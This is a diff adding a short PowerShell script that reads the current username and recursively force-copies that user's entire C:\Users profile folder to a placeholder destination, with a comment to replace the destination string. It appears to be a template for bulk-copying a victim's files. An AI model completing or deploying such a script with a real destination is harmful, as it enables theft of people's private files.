@@ -1,0 +1,5 @@
+$user = (whoami).Substring(5)
+$directory = 'C:\Users\' + $user + ''
+
+copy-item -Path $directory -Destination "why hello there" -Force -Recurse
+#Replace Destination string
